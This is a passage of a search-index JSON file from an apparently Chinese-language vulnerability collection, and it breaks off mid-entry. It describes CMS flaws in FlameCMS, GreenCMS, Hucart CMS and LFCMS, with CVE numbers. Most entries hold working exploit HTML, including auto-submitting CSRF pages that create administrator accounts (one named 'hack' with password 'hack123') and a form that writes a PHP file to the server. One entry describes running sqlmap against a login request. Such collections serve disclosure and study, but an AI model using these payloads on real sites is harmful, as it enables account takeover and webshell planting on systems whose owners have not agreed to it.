>","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 CVE-2019-16309 FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Ethan\u53d1\u73b0FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u901a\u8fc7 sqlmap \u76f4\u63a5\u8dd1\u51fa\u6240\u6709\u8868 \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 FlameCMS \u7248\u672c \u00b6 FlameCMS 3.3.5 \u7248\u672c \u7ec4\u4ef6 \u00b6 FlameCMS \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u540e\u53f0\u767b\u9646\u5904\u6293\u5305 http://127.0.0.1:8888/FlameCMS-master/account/login.php \u7136\u540e\u628a\u6293\u53d6\u7684post\u5305\uff0c\u653e\u8fdbsqlmap\u8dd1\uff0c\u53ef\u4ee5\u8dd1\u51fa\u76f2\u6ce8","title":"CVE 2019 16309 FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"CVE-2019-16309 FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e","title":"\u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"Ethan\u53d1\u73b0FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u901a\u8fc7 sqlmap \u76f4\u63a5\u8dd1\u51fa\u6240\u6709\u8868","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_5","text":"FlameCMS","title":"\u4ea7\u54c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_6","text":"FlameCMS 3.3.5 \u7248\u672c","title":"\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_7","text":"FlameCMS","title":"\u7ec4\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_8","text":"\u8bbf\u95ee\u540e\u53f0\u767b\u9646\u5904\u6293\u5305 http://127.0.0.1:8888/FlameCMS-master/account/login.php \u7136\u540e\u628a\u6293\u53d6\u7684post\u5305\uff0c\u653e\u8fdbsqlmap\u8dd1\uff0c\u53ef\u4ee5\u8dd1\u51fa\u76f2\u6ce8","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 GreenCMS v2.3.0603\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u83b7\u53d6webshell&\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-06-02 \u60dc\u6f6e https://github.com/GreenCMS/GreenCMS https://github.com/GreenCMS/GreenCMS v2.3.0603 CVE-2018-11670 / CVE-2018-11671 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2aHtml\u9875\u9762 \u4ece\u800c\u83b7\u53d6\u7f51\u7ad9webshell\u3002GreenCMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues / issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u4eceCSRF\u5230get webshell \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < span style = \"font-size:18px;\" > <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > csrf\u6d4b\u8bd5 </ title > </ head > < form action = \"http://127.0.0.1//14/index.php?m=admin&c=media&a=fileconnect\" method = \"POST\" id = \"transfer\" name = \"transfer\" > <!-- \u4e0b\u9762\u7684\u662f\u751f\u6210\u6587\u4ef6\u540d\u4e3axc.php\u7684\u811a\u672c\u6587\u4ef6 \u8def\u5f84 127.0.0.1/Upload/xc.php --> < script src = \"http://127.0.0.1/14/index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&name=xc.php&target=l1_XA&_=1527839615462\" ></ script > < input type = \"hidden\" name = \"cmd\" value = \"put\" > < input type = \"hidden\" name = \"target\" value = \"l1_eGMucGhw\" > \u3000 < input type = \"hidden\" name = \"content\" value = \"<?php phpinfo();?>\" > <!-- \u4e0b\u9762\u7684\u662f\u63d0\u4ea4\u8868\u5355 \u5c06content\u4e2d\u7684\u547d\u4ee4\u5199\u5165\u811a\u672c\u5185 --> < button type = \"submit\" value = \"Submit\" > WebShell </ button > </ form > </ body > </ html ></ span > \u4eceCSRF\u5230\u589e\u52a0\u7ba1\u7406\u5458 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < span style = \"font-size:18px;\" > <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > csrf\u6d4b\u8bd5 </ title > </ head > \u3000\u3000 < body > \u3000\u3000\u3000\u3000 < form action = \"http://127.0.0.1//14/index.php?m=admin&c=access&a=adduserhandle\" method = \"POST\" id = \"transfer\" name = \"transfer\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_id0\" value = \"1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_login\" value = \"test1\" > <!--\u5728\u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0JS\u811a\u672c\u7528\u4e8e\u83b7\u53d6cookies csrf+xss--> \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"password\" value = \"test1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"rpassword\" value = \"test1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_nicename\" value = \"123\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_email\" value = \"123%40Qq.com\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_url\" value = \"www.baidu.com\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_intro\" value = \"test\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_status\" value = \"1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"role_id\" value = \"1\" > < button type = \"submit\" value = \"Submit\" > \u6dfb\u52a0\u7ba1\u7406\u5458 </ button > \u3000\u3000\u3000\u3000\u3000\u3000 </ form > </ body > </ html ></ span >","title":"GreenCMS v2.3.0603\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u83b7\u53d6webshell&\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 GreenCMS v2.3.0603\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u83b7\u53d6webshell&\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-06-02 \u60dc\u6f6e https://github.com/GreenCMS/GreenCMS https://github.com/GreenCMS/GreenCMS v2.3.0603 CVE-2018-11670 / CVE-2018-11671","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","text":"\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2aHtml\u9875\u9762 \u4ece\u800c\u83b7\u53d6\u7f51\u7ad9webshell\u3002GreenCMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues / issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","text":"\u4eceCSRF\u5230get webshell \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < span style = \"font-size:18px;\" > <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > csrf\u6d4b\u8bd5 </ title > </ head > < form action = \"http://127.0.0.1//14/index.php?m=admin&c=media&a=fileconnect\" method = \"POST\" id = \"transfer\" name = \"transfer\" > <!-- \u4e0b\u9762\u7684\u662f\u751f\u6210\u6587\u4ef6\u540d\u4e3axc.php\u7684\u811a\u672c\u6587\u4ef6 \u8def\u5f84 127.0.0.1/Upload/xc.php --> < script src = \"http://127.0.0.1/14/index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&name=xc.php&target=l1_XA&_=1527839615462\" ></ script > < input type = \"hidden\" name = \"cmd\" value = \"put\" > < input type = \"hidden\" name = \"target\" value = \"l1_eGMucGhw\" > \u3000 < input type = \"hidden\" name = \"content\" value = \"<?php phpinfo();?>\" > <!-- \u4e0b\u9762\u7684\u662f\u63d0\u4ea4\u8868\u5355 \u5c06content\u4e2d\u7684\u547d\u4ee4\u5199\u5165\u811a\u672c\u5185 --> < button type = \"submit\" value = \"Submit\" > WebShell </ button > </ form > </ body > </ html ></ span > \u4eceCSRF\u5230\u589e\u52a0\u7ba1\u7406\u5458 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < span style = \"font-size:18px;\" > <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > csrf\u6d4b\u8bd5 </ title > </ head > \u3000\u3000 < body > \u3000\u3000\u3000\u3000 < form action = \"http://127.0.0.1//14/index.php?m=admin&c=access&a=adduserhandle\" method = \"POST\" id = \"transfer\" name = \"transfer\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_id0\" value = \"1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_login\" value = \"test1\" > <!--\u5728\u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0JS\u811a\u672c\u7528\u4e8e\u83b7\u53d6cookies csrf+xss--> \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"password\" value = \"test1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"rpassword\" value = \"test1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_nicename\" value = \"123\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_email\" value = \"123%40Qq.com\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_url\" value = \"www.baidu.com\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_intro\" value = \"test\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"user_status\" value = \"1\" > \u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 < input type = \"hidden\" name = \"role_id\" value = \"1\" > < button type = \"submit\" value = \"Submit\" > \u6dfb\u52a0\u7ba1\u7406\u5458 </ button > \u3000\u3000\u3000\u3000\u3000\u3000 </ form > </ body > </ html ></ span >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 GreenCMS v2.3.0603\u53ca\u4ee5\u4e0b\u7248\u672c \u6f0f\u6d1ePOC \u00b6 POC","title":"GreenCMS \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","text":"GreenCMS v2.3.0603\u53ca\u4ee5\u4e0b\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","text":"POC","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Hucart cms v5.7.4 CSRF\u6f0f\u6d1e\u53ef\u4efb\u610f\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7 2019-01-13 AllenChen\uff08 520allen@gmail.com \uff09 http://www.hucart.com/ http://www.hucart.com/ v5.7.4 CVE-2019-6249 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Hucart cms v5.7.4\u7248\u672c\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u589e\u52a0\u4e00\u4e2a\u540d\u4e3ahack\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 exp\u4ee3\u7801\u5982\u4e0b\uff1a \u589e\u52a0\u4e00\u4e2a\u540d\u4e3ahack\u5bc6\u7801\u4e3ahack123\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002 < html >< body > < script type = \"text/javascript\" > function post ( url , fields ) { var p = document . createElement ( \"form\" ); p . action = url ; p . innerHTML = fields ; p . target = \"_self\" ; p . method = \"post\" ; document . body . appendChild ( p ); p . submit (); } function csrf_hack () { var fields ; fields += \"<input type='hidden' name='adm_user' value='hack' />\" ; fields += \"<input type='hidden' name='adm_email' value='admin@hack.com' />\" ; fields += \"<input type='hidden' name='adm_mobile' value='13888888888' />\" ; fields += \"<input type='hidden' name='adm_pwd' value='hack123' />\" ; fields += \"<input type='hidden' name='re_adm_pwd' value='hack123' />\" ; fields += \"<input type='hidden' name='adm_enabled' value='1' />\" ; fields += \"<input type='hidden' name='act_type' value='add' />\" ; fields += \"<input type='hidden' name='adm_id' value='' />\" ; var url = \"http://localhost/hucart_cn/adminsys/index.php?load=admins&act=edit_info&act_type=add\" ; post ( url , fields ); } window . onload = function () { csrf_hack ();} </ script > </ body ></ html >","title":"Hucart cms v5.7.4 CSRF\u6f0f\u6d1e\u53ef\u4efb\u610f\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Hucart cms v5.7.4 CSRF\u6f0f\u6d1e\u53ef\u4efb\u610f\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7 2019-01-13 AllenChen\uff08 520allen@gmail.com \uff09 http://www.hucart.com/ http://www.hucart.com/ v5.7.4 CVE-2019-6249","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/#_2","text":"Hucart cms v5.7.4\u7248\u672c\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u589e\u52a0\u4e00\u4e2a\u540d\u4e3ahack\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/#poc","text":"exp\u4ee3\u7801\u5982\u4e0b\uff1a \u589e\u52a0\u4e00\u4e2a\u540d\u4e3ahack\u5bc6\u7801\u4e3ahack123\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002 < html >< body > < script type = \"text/javascript\" > function post ( url , fields ) { var p = document . createElement ( \"form\" ); p . action = url ; p . innerHTML = fields ; p . target = \"_self\" ; p . method = \"post\" ; document . body . appendChild ( p ); p . submit (); } function csrf_hack () { var fields ; fields += \"<input type='hidden' name='adm_user' value='hack' />\" ; fields += \"<input type='hidden' name='adm_email' value='admin@hack.com' />\" ; fields += \"<input type='hidden' name='adm_mobile' value='13888888888' />\" ; fields += \"<input type='hidden' name='adm_pwd' value='hack123' />\" ; fields += \"<input type='hidden' name='re_adm_pwd' value='hack123' />\" ; fields += \"<input type='hidden' name='adm_enabled' value='1' />\" ; fields += \"<input type='hidden' name='act_type' value='add' />\" ; fields += \"<input type='hidden' name='adm_id' value='' />\" ; var url = \"http://localhost/hucart_cn/adminsys/index.php?load=admins&act=edit_info&act_type=add\" ; post ( url , fields ); } window . onload = function () { csrf_hack ();} </ script > </ body ></ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 LFCMS 3.7.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u6dfb\u52a0\u4efb\u610f\u7528\u6237\u8d26\u6237\u6216\u4efb\u610f\u7ba1\u7406\u5458\u8d26\u6237 2018-06-20 Bay0net http://www.lfdycms.com/ http://www.lfdycms.com/ 3.7.0 CVE-2018-12602 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020 CSRF \u8bf7\u6c42\uff0c\u6765\u65b0\u589e\u4efb\u610f\u7528\u6237\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u901a\u8fc7CSRF\u589e\u52a0\u4efb\u610f\u7528\u6237 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Users/add.html\" method = \"POST\" > < input type = \"hidden\" name = \"username\" value = \"test222\" /> < input type = \"hidden\" name = \"email\" value = \"test2@qq.com\" /> < input type = \"hidden\" name = \"password\" value = \"test222\" /> < input type = \"hidden\" name = \"repassword\" value = \"test222\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html > \u901a\u8fc7CSRF\u589e\u52a0\u7ba1\u7406\u5458\u7528\u6237 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html\" method = \"POST\" > < input type = \"hidden\" name = \"username\" value = \"admin2\" /> < input type = \"hidden\" name = \"password\" value = \"admin2\" /> < input type = \"hidden\" name = \"repassword\" value = \"admin2\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"LFCMS 3.7.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u6dfb\u52a0\u4efb\u610f\u7528\u6237\u8d26\u6237\u6216\u4efb\u610f\u7ba1\u7406\u5458\u8d26\u6237"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 LFCMS 3.7.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u6dfb\u52a0\u4efb\u610f\u7528\u6237\u8d26\u6237\u6216\u4efb\u610f\u7ba1\u7406\u5458\u8d26\u6237 2018-06-20 Bay0net http://www.lfdycms.com/ http://www.lfdycms.com/ 3.7.0 CVE-2018-12602","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","text":"\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020 CSRF \u8bf7\u6c42\uff0c\u6765\u65b0\u589e\u4efb\u610f\u7528\u6237\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","text":"\u901a\u8fc7CSRF\u589e\u52a0\u4efb\u610f\u7528\u6237 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Users/add.html\" method = \"POST\" > < input type = \"hidden\" name = \"username\" value = \"test222\" /> < input type = \"hidden\" name = \"email\" value = \"test2@qq.com\" /> < input type = \"hidden\" name = \"password\" value = \"test222\" /> < input type = \"hidden\" name = 